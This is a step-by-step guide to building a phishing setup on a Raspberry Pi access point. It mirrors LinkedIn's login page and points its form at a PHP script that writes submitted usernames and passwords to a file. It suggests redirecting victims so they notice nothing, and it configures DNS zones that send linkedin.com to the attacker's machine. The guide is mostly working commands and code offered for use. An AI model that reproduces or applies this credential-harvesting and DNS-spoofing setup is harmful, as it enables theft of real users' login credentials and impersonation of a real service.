# Configuration Steps
## 1. Install required softwares
```
#sudo apt install apache2
#sudo apt install bind9
#sudo apt install php
```

## 2. Configure dnsmasq to share the network interface
```
#sudo nano /etc/dnsmasq.conf
```
add "bind-interfaces" in front the interface you set
```
bind-interfaces
interface=wlan0
dhcp-range=192.168.2.2,192.168.2.20,255.255.255.0,24h
```
after this step, bind9 service able to listen the IP for DNS server

## 3. Establish Phishing Website
a. Download web
You may download any website directly and modify it instead of write codes by yourself.
As an example:
```
#wget -mk https://www.linkedin.com
```
b. Move web to right path
Now the html file have been download to local. Move the file to apache2 server path
```
sudo mv Desktop/www.linkedin.com/index.html /var/www/html/
```
To hijack userdata, we may modify the action when user click submit or login button.
You will need to find where's the action in html file.
c. Modify action of submit action
```
#sudo nano /var/www/html/index.html
```
As an example, LinkedIn page using an form whose class in "sign-in-form", modify the action to "get.php". (We will create the php file later)
Also, you need notice the name or if for the entry box. For LinkedIn, the name are "session_key" and "session_password".
d. create php file
The name should the same as you modified in index.html, here, as the example, it will be get.php
```
#sudo nano /var/www/html/get.php
```
Add below codes to the file. It will record the username and password user inputed in a local file.
```
<?php
$username = $_POST['session_key'];
$password = $_POST['session_password'];
$TEXT = 'Username:'.$username." Password:".$password."\n";
$fo = fopen("home/pi/Desktop/password.text","a+") or die("something wrong");
fwrite($fo,$TEXT);
fclose($fo);
?>
```
At the end of the php, you may redirect the post request to the right url, so user can finish his login action and won't notice anything wrong.
In default, the php file will not have access to write in files, so we need do this step to authorize it.
```
#sudo chown -R www-data /home/pi/Desktop
```
## 4. DNS Configuration
a. set configuration path
```
sudo nano /etc/bind/named.conf.options
```
Add below statement in "options" block after "directory" pahth.
```
Dump-file "var/cache/bind/dump.db";
```
Configure the path of action file when certain Domain or IP visited.
```
#sudo nano /etc/bind/named.conf
```
```
zone "linkedin.com"{
      type master;
      file "/etc/bind/linkedin.com.db"
};
zone "2.168.192.in-addr.arpa"{
      type master;
      file "/etc/bind/192.168.2.db";
};
```
Configure the forward lookup file
```
#sudo nano /etc/bind/linkedin.com.db
```
```
$TTL 600
#ORIGIN linkedin.com.
@ IN  SOA ns.linkedin.com. admin.linkedin.com.(
      2008111001
      8H
      2H
      4W
      1D)
@ IN  NS  ns.linkedin.com.
@ IN  MX  10 mail.linkedin.com.

www IN  A 192.168.2.1
mail IN  A 192.168.2.1
ns  IN  A 192.168.2.1
*.linkedin.com  IN  A 192.168.2.1
```
configure the reverse lookup file
```
#sudo nano /etc/bind/192.168.2.db
```
```
$TTL 3D
@ IN  SOA ns.likedin.com.  admin.linkedin.com.(
      2008111001
      8H
      2H
      4W
      1D)
@ IN  NS  ns.linkedin.com.
101 IN  PTR www.linkedin.com.
102 IN  PTR mail.linkedin.com.
10  IN  PTR ns.linkedin.com.
```
```
#sudo rndc flush
#sudo service bind9 restart
```
